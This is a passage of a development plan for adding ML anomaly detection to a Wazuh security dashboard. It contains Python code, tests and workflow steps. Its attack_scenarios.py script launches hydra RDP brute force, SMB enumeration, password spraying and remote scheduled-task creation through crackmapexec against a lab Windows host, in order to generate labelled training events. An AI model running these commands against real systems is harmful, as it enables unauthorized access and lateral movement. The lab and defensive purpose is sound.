# Fase 6 — Deteção de Anomalias por ML Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add an Isolation Forest anomaly-detection layer to SentryLens that runs in parallel with the existing rule-based `event_catalog.py` classification, exposed via a new `/api/ml-anomalies` endpoint and frontend panel, with metrics proving where the ML model and the rules agree and diverge.

**Architecture:** Follows the existing `scripts/` pattern (`lifecycle.py`, `rbac.py`, `admin_activity.py`): a pure domain module receives already-fetched Wazuh alerts and returns a report dict; `main.py` stays a thin HTTP layer. The new piece is `feature_extractor.py`, a single shared module imported by both `train_anomaly_model.py` (offline training) and `ml_anomalies.py` (online inference via `main.py`), so feature computation can never drift between train and serve.

**Tech Stack:** Python stdlib + existing `httpx`/`fastapi`/`dotenv` stack, plus new deps `scikit-learn` and `joblib` for the model. Frontend: vanilla JS/Chart.js, matching `app.js`/`index.html`/`style.css` conventions already in the repo.

**Spec:** The contract is the "Gauntlet" brief pasted into this conversation on 2026-09-12 (no separate spec file exists in-repo) — reproduced in full in Global Constraints and the Process Constraints section below so this plan is self-contained.

## Global Constraints

- `feature_extractor.py` is the single source of truth for feature computation, imported unchanged by both `train_anomaly_model.py` and `main.py` (via `ml_anomalies.py`) — feature logic must never diverge between train and inference.
- Do **not** modify `event_catalog.py`. The ML layer only imports `CRITICAL_EVENTS`/`classify_alert` from it — it never edits it.
- Reuse `wazuh_client.py`'s existing `WazuhIndexerClient`/`WazuhManagerClient` — never reimplement Wazuh HTTP access.
- Feature vector per event, in this exact order: hour of day, day of week, Event ID (encoding), failed attempts in the last hour for the same user, special privileges (0/1), new source IP for that user (0/1), severity already assigned by `event_catalog.py`.
- Regression tests in the style of `scripts/test_with_mock.py` (standalone script, `check()`/`[OK]`/`[FALHOU]` pattern, `sys.exit(1)` on failure, no pytest) covering the new endpoint and `feature_extractor.py` in isolation.
- Frontend visual identity must match the existing navy + cyan theme (`--navy-950`, `--navy-800`, `--cyan-400`, `--cyan-600`, `--cyan-700` in `style.css`) and existing tab/panel/card/table markup conventions.
- No real lab data yet: pipeline must be built and tested against fixtures/mocks only. Do **not** claim or imply the trained model's metrics reflect real-world performance — that validation only happens once the VM has run for a few days. This limitation must be documented in `README.md`.
- **Deviation on record:** the contract names `sample_events_real.xml` as training input. That file does not exist anywhere in this repo (confirmed by search) and no XML tooling exists in the project — everything here is JSON. This plan substitutes a generated JSON fixture, `scripts/sample_events_real.json`, in the same shape the Wazuh Indexer actually returns (matching `test_with_mock.py`'s `MOCK_ALERTS` shape), plus a companion `scripts/sample_attack_log.jsonl`. This substitution must be logged as a deviation in the Wave 3 Notion checkpoint entry.

### Process constraints (from the Gauntlet contract, not enforced by tooling — the executor must follow manually)

- Phase into waves in this order; each wave is independent of later waves but may depend on earlier ones as noted per task. Do not start a wave until the previous one's checkpoint is closed.
- Each wave closes with a **git commit of the exact files created/modified in that wave** — never `git add -A`.
- Each wave gets an independent AAA review gate before its checkpoint commit. If the gate blocks, fix and re-request review, up to 3 rounds. If still blocked after 3 rounds, stop, commit nothing further for that wave, and report BLOCKED with the reason — do not proceed to the next wave.
- After each wave's checkpoint commit (gate passed), append a block to the Notion page `page_id: 3caa99e6-526b-8111-89be-db8b6ffe765b`, section "Registo de execução — Fase 6", containing: wave number/name, exact files touched, checkpoint commit hash, final AAA grade + per-criterion notes, and any deviations/decisions. Never rewrite previous waves' entries — always append. Only log waves that actually closed (approved, or BLOCKED after 3 rounds).
- Commit messages for these checkpoints should use the `gauntlet(sentrylens): checkpoint <wave> <description>` style already present in this repo's history (see `git log`).

---

## File Structure

| File | Wave | Responsibility |
|---|---|---|
| `scripts/attack_scenarios.py` | 1 | CLI scenario runner for the Kali VM; logs one JSON line per launched attack. |
| `scripts/export_snapshot.py` | 1 | Pulls `/api/alerts` + `/api/stats` + the attack log into a timestamped snapshot file. |
| `.gitignore` | 1 | Ignore runtime-generated ML artifacts (attack log, snapshots, trained model). |
| `scripts/.env.example` | 1 | Document new configurable paths. |
| `scripts/feature_extractor.py` | 2 | Shared feature computation + attack-log labeling + vectorization. |
| `scripts/test_feature_extractor.py` | 2 | Standalone regression tests for the module above. |
| `scripts/_generate_sample_ml_data.py` | 3 | Deterministic generator for the two fixture files below (reproducible, no XML dependency). |
| `scripts/sample_events_real.json` | 3 | Generated fixture: Wazuh-alert-shaped synthetic events (deviation from spec's `.xml`, see Global Constraints). |
| `scripts/sample_attack_log.jsonl` | 3 | Generated fixture: attack log correlated with the events above. |
| `scripts/train_anomaly_model.py` | 3 | Trains Isolation Forest + StandardScaler, saves `.pkl`s, writes a metrics report. |
| `scripts/ml_anomalies.py` | 4 | Pure module: loads model/scaler, scores alerts, builds the report `main.py` serves. |
| `scripts/main.py` | 4 | Modify: add `GET /api/ml-anomalies`. |
| `scripts/test_ml_anomalies.py` | 4 | Standalone regression tests for the endpoint. |
| `index.html` | 5 | New "ML Anomalias" tab + panel markup. |
| `app.js` | 5 | New `loadMlAnomaliesPanel()` + render functions + tab wiring. |
| `style.css` | 5 | New styles for the agreement/divergence indicator, reusing existing tokens. |
| `README.md` | 5 | Document the new panel, the fixture-data limitation, and how to retrain. |

---

## Wave 1: `attack_scenarios.py` + `export_snapshot.py`

These two tasks are independent of each other and of every later wave (later waves consume the *shape* of their output, defined here, not their code).

### Task 1: `attack_scenarios.py` — attack scenario runner for the Kali VM

**Files:**
- Create: `scripts/attack_scenarios.py`
- Modify: `.gitignore` (ignore the runtime log this script writes)

**Interfaces:**
- Produces: JSONL log format consumed by `feature_extractor.load_attack_log()` in Wave 2 — one JSON object per line:
  ```json
  {"timestamp": "2026-09-12T14:30:00+00:00", "scenario": "brute_force_rdp", "target": "192.168.1.20", "tool": "hydra", "status": "launched", "details": {"returncode": 0, "command": "hydra ..."}}
  ```
  `timestamp` is always UTC ISO-8601 (`datetime.now(timezone.utc).isoformat()`). `status` is `"launched"` (subprocess started and returned) or `"failed"` (tool missing / exception) or `"skipped"` (required arg missing, e.g. no credentials supplied for a post-compromise scenario).

This script is a **manual lab script**, like `setup-hyperv-lab.ps1` / `install-wazuh.sh` / `install-wazuh-agent.ps1` documented in `CLAUDE.md` — it runs on the Kali VM against the lab's Windows agent, not in this repo's CI, and per project convention (see `scripts/README.md`) these lab scripts are not unit-tested end-to-end. The one pure/deterministic piece (`format_log_entry`) does get a small inline self-check since it costs nothing and the AAA gate will want to see the log shape verified.

- [ ] **Step 1: Write the script**

```python
"""
Gerador de cenários de ataque para a VM Kali do laboratório SentryLens.

Corre-se MANUALMENTE na VM Kali (não faz parte do backend/CI) contra o
agente Windows do laboratório, à semelhança dos outros scripts de
automação do laboratório (ver scripts/README.md): não há execução
automática nem testes de integração reais aqui, porque isso implicaria
lançar ataques de facto contra a VM.

Cada cenário lançado escreve uma linha JSON no log de ataques
(default: scripts/attack_log.jsonl), que o feature_extractor.py usa mais
tarde para atribuir o rótulo verdadeiro is_attack aos eventos do Wazuh
por correspondência de timestamp.

Uso:
    python attack_scenarios.py --list
    python attack_scenarios.py --target 192.168.1.20 --scenario brute_force_rdp
    python attack_scenarios.py --target 192.168.1.20 --all
    python attack_scenarios.py --target 192.168.1.20 --scenario lateral_movement_schtasks \
        --user administrator --password "Sup3rS3cret!"
"""

import argparse
import json
import shutil
import subprocess
import sys
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Callable

DEFAULT_LOG_PATH = Path(__file__).parent / "attack_log.jsonl"


@dataclass
class Scenario:
    name: str
    description: str
    tool: str
    event_ids: list[int]  # Event IDs do event_catalog.py que este cenário tipicamente gera
    build_command: Callable[[argparse.Namespace], list[str] | None]
    # build_command devolve None (em vez de lançar) quando faltam argumentos
    # obrigatórios (ex: credenciais) — o cenário fica "skipped", não crasha.


def _brute_force_rdp_command(args: argparse.Namespace) -> list[str] | None:
    wordlist = args.wordlist or "/usr/share/wordlists/rockyou.txt"
    return ["hydra", "-l", args.user or "administrator", "-P", wordlist, "-t", "4", f"rdp://{args.target}"]


def _smb_enum_command(args: argparse.Namespace) -> list[str] | None:
    return ["crackmapexec", "smb", args.target, "--shares"]


def _blank_password_check_command(args: argparse.Namespace) -> list[str] | None:
    return ["crackmapexec", "smb", args.target, "-u", "", "-p", ""]


def _lateral_movement_schtasks_command(args: argparse.Namespace) -> list[str] | None:
    if not args.user or not args.password:
        return None  # requer credenciais válidas (simula pós-comprometimento)
    return [
        "crackmapexec", "smb", args.target,
        "-u", args.user, "-p", args.password,
        "-X", "schtasks /create /tn SentryLensLab /tr calc.exe /sc once /st 03:14",
    ]


def _account_lockout_spray_command(args: argparse.Namespace) -> list[str] | None:
    return ["crackmapexec", "smb", args.target, "-u", "convidado", "-p", "wrong-password-1234"]


SCENARIOS: dict[str, Scenario] = {
    "brute_force_rdp": Scenario(
        name="brute_force_rdp",
        description="Força bruta de RDP contra o agente alvo (gera 4625 repetidos).",
        tool="hydra",
        event_ids=[4625, 4740],
        build_command=_brute_force_rdp_command,
    ),
    "smb_enum": Scenario(
        name="smb_enum",
        description="Enumeração de partilhas SMB (gera 5140/5145).",
        tool="crackmapexec",
        event_ids=[5140, 5145],
        build_command=_smb_enum_command,
    ),
    "blank_password_check": Scenario(
        name="blank_password_check",
        description="Verificação de sessão nula / password em branco (gera 4797).",
        tool="crackmapexec",
        event_ids=[4797],
        build_command=_blank_password_check_command,
    ),
    "lateral_movement_schtasks": Scenario(
        name="lateral_movement_schtasks",
        description="Pós-comprometimento: cria tarefa agendada via SMB (gera 4672 + 4698).",
        tool="crackmapexec",
        event_ids=[4672, 4698],
        build_command=_lateral_movement_schtasks_command,
    ),
    "account_lockout_spray": Scenario(
        name="account_lockout_spray",
        description="Password spraying com password errada para forçar bloqueio (gera 4625/4740).",
        tool="crackmapexec",
        event_ids=[4625, 4740],
        build_command=_account_lockout_spray_command,
    ),
}


def format_log_entry(
    scenario_name: str,
    target: str,
    tool: str,
    status: str,
    details: dict | None = None,
    now: datetime | None = None,
) -> dict:
    """Constrói a entrada de log (função pura, testável sem lançar ataques)."""
    timestamp = (now or datetime.now(timezone.utc)).isoformat()
    return {
        "timestamp": timestamp,
        "scenario": scenario_name,
        "target": target,
        "tool": tool,
        "status": status,
        "details": details or {},
    }


def append_attack_log(entry: dict, log_path: Path = DEFAULT_LOG_PATH) -> None:
    with open(log_path, "a", encoding="utf-8") as handle:
        handle.write(json.dumps(entry, ensure_ascii=False) + "\n")


def run_scenario(scenario: Scenario, args: argparse.Namespace, log_path: Path = DEFAULT_LOG_PATH) -> dict:
    command = scenario.build_command(args)
    if command is None:
        entry = format_log_entry(scenario.name, args.target, scenario.tool, "skipped",
                                  {"reason": "argumentos obrigatórios em falta (ex: --user/--password)"})
        append_attack_log(entry, log_path)
        return entry

    if shutil.which(command[0]) is None:
        entry = format_log_entry(scenario.name, args.target, scenario.tool, "failed",
                                  {"reason": f"ferramenta '{command[0]}' não encontrada no PATH"})
        append_attack_log(entry, log_path)
        return entry

    try:
        result = subprocess.run(command, capture_output=True, text=True, timeout=args.timeout)
        entry = format_log_entry(
            scenario.name, args.target, scenario.tool, "launched",
            {"returncode": result.returncode, "command": " ".join(command)},
        )
    except subprocess.TimeoutExpired:
        entry = format_log_entry(scenario.name, args.target, scenario.tool, "failed",
                                  {"reason": "timeout", "command": " ".join(command)})
    except Exception as exc:
        entry = format_log_entry(scenario.name, args.target, scenario.tool, "failed",
                                  {"reason": str(exc), "command": " ".join(command)})

    append_attack_log(entry, log_path)
    return entry


def _self_check() -> None:
    """Verificação rápida e determinística do formato de log (sem lançar nada)."""
    fixed_time = datetime(2026, 9, 12, 14, 30, 0, tzinfo=timezone.utc)
    entry = format_log_entry("brute_force_rdp", "192.168.1.20", "hydra", "launched", {"returncode": 0}, now=fixed_time)
    assert entry["timestamp"] == "2026-09-12T14:30:00+00:00", entry["timestamp"]
    assert entry["scenario"] == "brute_force_rdp"
    assert set(entry.keys()) == {"timestamp", "scenario", "target", "tool", "status", "details"}
    print("[OK   ] format_log_entry produz o formato JSONL esperado")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--list", action="store_true", help="Lista os cenários disponíveis e sai")
    parser.add_argument("--self-check", action="store_true", help="Corre a verificação interna do formato de log e sai")
    parser.add_argument("--target", help="IP/hostname do agente Windows alvo")
    parser.add_argument("--scenario", choices=sorted(SCENARIOS), help="Nome do cenário a lançar")
    parser.add_argument("--all", action="store_true", help="Lança todos os cenários, em sequência")
    parser.add_argument("--user", help="Utilizador (cenários pós-comprometimento)")
    parser.add_argument("--password", help="Password (cenários pós-comprometimento)")
    parser.add_argument("--wordlist", help="Wordlist para força bruta (default: rockyou.txt)")
    parser.add_argument("--timeout", type=int, default=60, help="Timeout por cenário, em segundos")
    parser.add_argument("--log-path", default=str(DEFAULT_LOG_PATH), help="Caminho do ficheiro de log JSONL")
    args = parser.parse_args()

    if args.self_check:
        _self_check()
        return

    if args.list:
        for scenario in SCENARIOS.values():
            print(f"{scenario.name:28s} [{scenario.tool}] {scenario.description} (Event IDs: {scenario.event_ids})")
        return

    if not args.target:
        parser.error("--target é obrigatório (exceto com --list/--self-check)")

    log_path = Path(args.log_path)
    names = list(SCENARIOS) if args.all else [args.scenario] if args.scenario else []
    if not names:
        parser.error("indica --scenario NOME ou --all")

    for name in names:
        entry = run_scenario(SCENARIOS[name], args, log_path)
        print(f"[{entry['status'].upper():8s}] {name} -> {entry['details']}")


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: Verify the pure formatting logic without touching the network**

Run: `python scripts/attack_scenarios.py --self-check`
Expected: `[OK   ] format_log_entry produz o formato JSONL esperado`

- [ ] **Step 3: Verify the registry and CLI wiring**

Run: `python scripts/attack_scenarios.py --list`
Expected: 5 lines, one per scenario in `SCENARIOS`, no errors (this must work on the Windows dev machine too — it never actually invokes `hydra`/`crackmapexec` for `--list`).

- [ ] **Step 4: Ignore the runtime log this script writes**

Add to `.gitignore` under the existing "Estado local gerado em runtime" section:
```
scripts/attack_log.jsonl
```

- [ ] **Step 5: Commit**

```bash
git add scripts/attack_scenarios.py .gitignore
git commit -m "gauntlet(sentrylens): checkpoint onda 1a - attack_scenarios.py"
```

### Task 2: `export_snapshot.py` — snapshot exporter

**Files:**
- Create: `scripts/export_snapshot.py`
- Modify: `.gitignore` (ignore generated snapshots)

**Interfaces:**
- Consumes: nothing from Task 1 at import time; at runtime it reads whatever `DEFAULT_LOG_PATH` (`scripts/attack_log.jsonl`) currently contains, tolerating an empty/missing file.
- Produces: `snapshots/<name>.json` files shaped as:
  ```json
  {"exported_at": "...", "alerts": {...API /api/alerts body...}, "stats": {...API /api/stats body...}, "attack_log": [...entries...]}
  ```
  This shape is documentation only — no later wave consumes `export_snapshot.py`'s output programmatically; it exists for the human to periodically capture what the live lab looked like.

- [ ] **Step 1: Write the script**

```python
"""
Exporta um snapshot do estado atual do backend SentryLens: /api/alerts,
/api/stats e o log de ataques da VM Kali (attack_scenarios.py), para um
ficheiro único em scripts/snapshots/AAAA-MM-DD_HH-MM.json.

Nunca sobrescreve um snapshot anterior: se já existir um ficheiro para o
mesmo minuto, acrescenta um sufixo numérico (_2, _3, ...).

Uso:
    python export_snapshot.py                       # usa http://localhost:8001
    python export_snapshot.py --api-base http://localhost:8001 --hours 24
"""

import argparse
import json
from datetime import datetime
from pathlib import Path

import httpx

DEFAULT_ATTACK_LOG_PATH = Path(__file__).parent / "attack_log.jsonl"
DEFAULT_OUTPUT_DIR = Path(__file__).parent / "snapshots"


def fetch_json(url: str, params: dict | None = None, timeout: float = 15.0) -> dict:
    response = httpx.get(url, params=params, timeout=timeout)
    response.raise_for_status()
    return response.json()


def load_attack_log(log_path: Path = DEFAULT_ATTACK_LOG_PATH) -> list[dict]:
    if not log_path.exists():
        return []
    entries = []
    with open(log_path, encoding="utf-8") as handle:
        for line in handle:
            line = line.strip()
            if line:
                entries.append(json.loads(line))
    return entries


def build_snapshot(alerts_data: dict, stats_data: dict, attack_log: list[dict], now: datetime | None = None) -> dict:
    """Função pura: junta as três fontes já obtidas num único dict de snapshot."""
    return {
        "exported_at": (now or datetime.now()).isoformat(),
        "alerts": alerts_data,
        "stats": stats_data,
        "attack_log": attack_log,
    }


def unique_snapshot_path(output_dir: Path, now: datetime | None = None) -> Path:
    """Nome baseado no minuto atual; nunca reutiliza/sobrescreve um ficheiro existente."""
    now = now or datetime.now()
    base_name = now.strftime("%Y-%m-%d_%H-%M")
    candidate = output_dir / f"{base_name}.json"
    suffix = 2
    while candidate.exists():
        candidate = output_dir / f"{base_name}_{suffix}.json"
        suffix += 1
    return candidate


def save_snapshot(snapshot: dict, output_dir: Path = DEFAULT_OUTPUT_DIR, now: datetime | None = None) -> Path:
    output_dir.mkdir(parents=True, exist_ok=True)
    path = unique_snapshot_path(output_dir, now)
    with open(path, "w", encoding="utf-8") as handle:
        json.dump(snapshot, handle, ensure_ascii=False, indent=2)
    return path


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--api-base", default="http://localhost:8001")
    parser.add_argument("--hours", type=int, default=24)
    parser.add_argument("--attack-log", default=str(DEFAULT_ATTACK_LOG_PATH))
    parser.add_argument("--output-dir", default=str(DEFAULT_OUTPUT_DIR))
    args = parser.parse_args()

    alerts_data = fetch_json(f"{args.api_base}/api/alerts", params={"hours": args.hours})
    stats_data = fetch_json(f"{args.api_base}/api/stats", params={"hours": args.hours})
    attack_log = load_attack_log(Path(args.attack_log))

    snapshot = build_snapshot(alerts_data, stats_data, attack_log)
    path = save_snapshot(snapshot, Path(args.output_dir))
    print(f"Snapshot escrito em: {path}")


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: Write a small manual smoke check for the pure functions (no network, no pytest — matches project convention)**

Run this inline check (temporary, not committed) to confirm the pure logic before wiring it to a live backend:

```bash
python -c "
from pathlib import Path
from datetime import datetime
import sys
sys.path.insert(0, 'scripts')
from export_snapshot import build_snapshot, unique_snapshot_path, save_snapshot

snap = build_snapshot({'total': 0, 'alerts': []}, {'total_alerts': 0}, [], now=datetime(2026, 9, 12, 14, 30))
assert snap['exported_at'] == '2026-09-12T14:30:00'
assert snap['alerts']['total'] == 0

tmp = Path('scripts/snapshots')
p1 = save_snapshot(snap, tmp, now=datetime(2026, 9, 12, 14, 30))
p2 = save_snapshot(snap, tmp, now=datetime(2026, 9, 12, 14, 30))
assert p1 != p2, 'segundo snapshot no mesmo minuto devia ganhar sufixo _2'
assert p1.exists() and p2.exists()
p1.unlink(); p2.unlink()
print('OK: build_snapshot / unique_snapshot_path / save_snapshot corretos')
"
```

Expected: `OK: build_snapshot / unique_snapshot_path / save_snapshot corretos`, then delete the now-empty `scripts/snapshots/` dir if it was created by the check (`rmdir scripts/snapshots` if empty) so nothing untracked lingers before commit.

- [ ] **Step 3: Ignore generated snapshots**

Add to `.gitignore` under the same "Estado local gerado em runtime" section:
```
scripts/snapshots/
```

- [ ] **Step 4: Commit**

```bash
git add scripts/export_snapshot.py .gitignore
git commit -m "gauntlet(sentrylens): checkpoint onda 1b - export_snapshot.py"
```

**Wave 1 checkpoint:** two commits above (kept separate since the tasks are independent and either could be reviewed/reverted on its own — squash into one commit only if the AAA reviewer prefers a single "onda 1" commit; either is acceptable since both stay within Wave 1's exact file set). Run the Wave 1 AAA gate, then log the Notion entry for "Onda 1" with both commit hashes and files.

---

## Wave 2: `feature_extractor.py` + tests

Depends on Wave 1 only for the *log line shape* documented in Task 1 (not its code — no import).

### Task 3: `feature_extractor.py`

**Files:**
- Create: `scripts/feature_extractor.py`

**Interfaces:**
- Consumes: `event_catalog.CRITICAL_EVENTS` and `event_catalog.classify_alert` (read-only import, `event_catalog.py` is never modified).
- Produces (consumed by `train_anomaly_model.py` in Wave 3 and `ml_anomalies.py` in Wave 4):
  - `FEATURE_NAMES: list[str]` — the 7 features, in vector order.
  - `load_attack_log(path: str) -> list[dict]`
  - `extract_features(alerts: list[dict]) -> list[dict]`
  - `label_with_attack_log(features: list[dict], attack_log: list[dict], window_seconds: int = 120) -> list[dict]`
  - `vectorize(features: list[dict]) -> list[list[float]]`

- [ ] **Step 1: Write the failing tests first**

Create `scripts/test_feature_extractor.py`:

```python
"""
Testes de regressão do feature_extractor.py, isolado (sem Wazuh, sem
modelo treinado). Segue o estilo de test_with_mock.py: script standalone,
check()/[OK]/[FALHOU], sys.exit(1) em caso de falha.

Correr:
    python test_feature_extractor.py
"""

import sys

from event_catalog import CRITICAL_EVENTS
from feature_extractor import FEATURE_NAMES, extract_features, label_with_attack_log, load_attack_log, vectorize

failures: list[str] = []


def check(label: str, condition: bool) -> None:
    print(f"[{'OK   ' if condition else 'FALHOU'}] {label}")
    if not condition:
        failures.append(label)


def alert(event_id: int, ts: str, user: str = "jsilva", ip: str = "192.168.1.10", agent_ip: str = "192.168.1.5") -> dict:
    return {
        "@timestamp": ts,
        "agent": {"name": "WIN-PC01", "ip": agent_ip},
        "rule": {"id": "1", "description": "x", "level": 5},
        "data": {"win": {"system": {"eventID": str(event_id)}, "eventdata": {"targetUserName": user, "ipAddress": ip}}},
        "full_log": "x",
    }


def run() -> None:
    # --- hour_of_day / day_of_week ---
    feats = extract_features([alert(4624, "2026-09-10T14:05:00Z")])  # 2026-09-10 is a Thursday
    check("extract_features devolve 1 linha para 1 alerta", len(feats) == 1)
    check("hour_of_day extraído corretamente (14h)", feats[0]["hour_of_day"] == 14)
    check("day_of_week extraído corretamente (Thursday = 3)", feats[0]["day_of_week"] == 3)

    # --- event_id_encoded é determinístico e vem do event_catalog partilhado ---
    known_order = sorted(CRITICAL_EVENTS.keys())
    feats_4625 = extract_features([alert(4625, "2026-09-10T14:05:00Z")])
    check("event_id_encoded(4625) == posição de 4625 em CRITICAL_EVENTS ordenado",
          feats_4625[0]["event_id_encoded"] == known_order.index(4625))

    feats_unknown = extract_features([alert(9999, "2026-09-10T14:05:00Z")])
    check("event_id_encoded para Event ID desconhecido usa o bucket 'outro' (len(known_order))",
          feats_unknown[0]["event_id_encoded"] == len(known_order))

    # --- failed_attempts_last_hour ---
    burst = [alert(4625, f"2026-09-10T10:0{i}:00Z", user="admin") for i in range(5)]
    burst_feats = extract_features(burst)
    check("1ª falha do burst conta 1 (inclui-se a si própria)", burst_feats[0]["failed_attempts_last_hour"] == 1)
    check("5ª falha do burst conta 5 (todas dentro da mesma hora)", burst_feats[4]["failed_attempts_last_hour"] == 5)

    other_user = alert(4625, "2026-09-10T10:02:00Z", user="guest")
    mixed_feats = extract_features(burst[:2] + [other_user])
    check("utilizador diferente não herda a contagem de outro utilizador",
          mixed_feats[-1]["failed_attempts_last_hour"] == 1)

    far_apart = [alert(4625, "2026-09-10T08:00:00Z", user="admin"), alert(4625, "2026-09-10T10:00:00Z", user="admin")]
    far_feats = extract_features(far_apart)
    check("falha 2h depois não conta a falha anterior (fora da janela de 1h)",
          far_feats[1]["failed_attempts_last_hour"] == 1)

    # --- has_special_privileges ---
    priv_feats = extract_features([alert(4672, "2026-09-10T14:05:00Z")])
    check("4672 (atividade_privilegiada) marca has_special_privileges=1", priv_feats[0]["has_special_privileges"] == 1)
    non_priv_feats = extract_features([alert(4624, "2026-09-10T14:05:00Z")])
    check("4624 (autenticacao) marca has_special_privileges=0", non_priv_feats[0]["has_special_privileges"] == 0)

    # --- is_new_source_ip ---
    same_user_diff_ip = [
        alert(4624, "2026-09-10T09:00:00Z", user="mcosta", ip="10.0.0.1"),
        alert(4624, "2026-09-10T09:05:00Z", user="mcosta", ip="10.0.0.1"),
        alert(4624, "2026-09-10T09:10:00Z", user="mcosta", ip="10.0.0.2"),
    ]
    ip_feats = extract_features(same_user_diff_ip)
    check("1º IP visto para o utilizador é sempre 'novo'", ip_feats[0]["is_new_source_ip"] == 1)
    check("repetir o mesmo IP não é 'novo'", ip_feats[1]["is_new_source_ip"] == 0)
    check("IP diferente para o mesmo utilizador volta a ser 'novo'", ip_feats[2]["is_new_source_ip"] == 1)

    # --- severity_encoded ---
    high_feats = extract_features([alert(4726, "2026-09-10T09:00:00Z")])  # 4726 = high
    low_feats = extract_features([alert(4624, "2026-09-10T09:00:00Z")])  # 4624 = low
    check("severidade 'high' codifica maior que 'low'", high_feats[0]["severity_encoded"] > low_feats[0]["severity_encoded"])

    # --- rule_flagged reflete a classificação de severidade alta ---
    check("rule_flagged é True para eventos 'high'", high_feats[0]["rule_flagged"] is True)
    check("rule_flagged é False para eventos 'low'", low_feats[0]["rule_flagged"] is False)

    # --- ordem/consistência do vetor ---
    check("FEATURE_NAMES tem 7 features, na ordem do contrato", FEATURE_NAMES == [
        "hour_of_day", "day_of_week", "event_id_encoded", "failed_attempts_last_hour",
        "has_special_privileges", "is_new_source_ip", "severity_encoded",
    ])
    vectors = vectorize(ip_feats)
    check("vectorize devolve um vetor por linha, do tamanho de FEATURE_NAMES",
          len(vectors) == len(ip_feats) and all(len(v) == len(FEATURE_NAMES) for v in vectors))

    # --- label_with_attack_log ---
    events = [
        alert(4625, "2026-09-10T10:00:00Z", user="convidado"),
        alert(4625, "2026-09-10T10:01:00Z", user="convidado"),
        alert(4624, "2026-09-10T12:00:00Z", user="mcosta"),  # fora de qualquer janela de ataque
    ]
    features = extract_features(events)
    attack_log = [{"timestamp": "2026-09-10T10:00:00+00:00", "scenario": "brute_force_rdp", "target": "x", "tool": "hydra", "status": "launched", "details": {}}]
    labeled = label_with_attack_log(features, attack_log, window_seconds=120)
    check("evento dentro da janela de ataque fica is_attack=1", labeled[0]["is_attack"] == 1 and labeled[1]["is_attack"] == 1)
    check("evento fora da janela de ataque fica is_attack=0", labeled[2]["is_attack"] == 0)

    # --- load_attack_log lê JSONL ---
    import tempfile, os
    with tempfile.NamedTemporaryFile(mode="w", suffix=".jsonl", delete=False, encoding="utf-8") as tmp:
        tmp.write('{"timestamp": "2026-09-10T10:00:00+00:00", "scenario": "x", "target": "y", "tool": "z", "status": "launched", "details": {}}\n')
        tmp_path = tmp.name
    loaded = load_attack_log(tmp_path)
    os.unlink(tmp_path)
    check("load_attack_log lê uma entrada por linha", len(loaded) == 1 and loaded[0]["scenario"] == "x")

    print()
    if failures:
        print(f"[FALHOU] {len(failures)} teste(s) falharam: {failures}")
        sys.exit(1)
    print("[OK] Todos os testes passaram")
    sys.exit(0)


if __name__ == "__main__":
    run()
```

- [ ] **Step 2: Run it to confirm it fails (module doesn't exist yet)**

Run: `cd scripts && python test_feature_extractor.py`
Expected: `ModuleNotFoundError: No module named 'feature_extractor'`

- [ ] **Step 3: Implement `feature_extractor.py`**

```python
"""
Extração de features para o painel de deteção de anomalias por ML
(Fase 6). MÓDULO ÚNICO E PARTILHADO entre treino (train_anomaly_model.py)
e inferência (ml_anomalies.py, via main.py) — a lógica de extração NÃO
pode divergir entre os dois caminhos, por isso ambos importam só daqui.

Não faz I/O de rede nem sabe nada de Wazuh HTTP — recebe sempre uma
lista de alertas já obtida (mesmo formato devolvido pelo Wazuh Indexer,
ver wazuh_client.WazuhIndexerClient.get_recent_alerts) e devolve
estruturas Python simples.

As 7 features, na ordem definida pelo contrato da Fase 6:
    1. hour_of_day               - hora do evento (0-23)
    2. day_of_week                - dia da semana (0=segunda ... 6=domingo)
    3. event_id_encoded            - Event ID codificado (posição ordinal
                                      entre os Event IDs conhecidos em
                                      event_catalog.CRITICAL_EVENTS;
                                      desconhecidos ficam no último bucket)
    4. failed_attempts_last_hour  - nº de falhas de logon (4625) do mesmo
                                      utilizador na hora anterior a este
                                      evento, incluindo-o a ele próprio se
                                      for também uma falha
    5. has_special_privileges     - 1 se a categoria do evento (segundo
                                      event_catalog) for "atividade_privilegiada"
    6. is_new_source_ip           - 1 se é a primeira vez que se vê este IP
                                      de origem para este utilizador
    7. severity_encoded            - severidade do event_catalog, ordinal
                                      (info=0, low=1, medium=2, high=3)

`is_attack` (rótulo verdadeiro, só para treino/avaliação) não faz parte
do vetor de features — é atribuído à parte por label_with_attack_log(),
por correspondência de timestamp com o log do attack_scenarios.py.
"""

import json
from datetime import datetime, timedelta, timezone

from event_catalog import CRITICAL_EVENTS, classify_alert

FEATURE_NAMES: list[str] = [
    "hour_of_day",
    "day_of_week",
    "event_id_encoded",
    "failed_attempts_last_hour",
    "has_special_privileges",
    "is_new_source_ip",
    "severity_encoded",
]

_EVENT_ID_ORDER: list[int] = sorted(CRITICAL_EVENTS.keys())
_EVENT_ID_INDEX: dict[int, int] = {eid: idx for idx, eid in enumerate(_EVENT_ID_ORDER)}
_UNKNOWN_EVENT_ID_BUCKET = len(_EVENT_ID_ORDER)

_SEVERITY_ORDER: dict[str, int] = {"info": 0, "low": 1, "medium": 2, "high": 3}

FAILED_LOGON_EVENT_ID = 4625
FAILED_ATTEMPTS_WINDOW = timedelta(hours=1)


def _parse_timestamp(raw_timestamp: str | None) -> datetime | None:
    """Mesma convenção usada em lifecycle.py/admin_activity.py: aceita o
    sufixo 'Z', assume UTC quando não há fuso indicado, devolve None em
    vez de lançar exceção para timestamps malformados."""
    if not raw_timestamp or not isinstance(raw_timestamp, str):
        return None
    normalized = raw_timestamp.strip().replace("Z", "+00:00")
    try:
        parsed = datetime.fromisoformat(normalized)
    except ValueError:
        return None
    if parsed.tzinfo is None:
        parsed = parsed.replace(tzinfo=timezone.utc)
    return parsed


def _extract_event_id(alert: dict) -> int | None:
    try:
        raw = alert.get("data", {}).get("win", {}).get("system", {}).get("eventID")
        return int(raw) if raw is not None else None
    except (TypeError, ValueError):
        return None


def _extract_target_user(alert: dict) -> str:
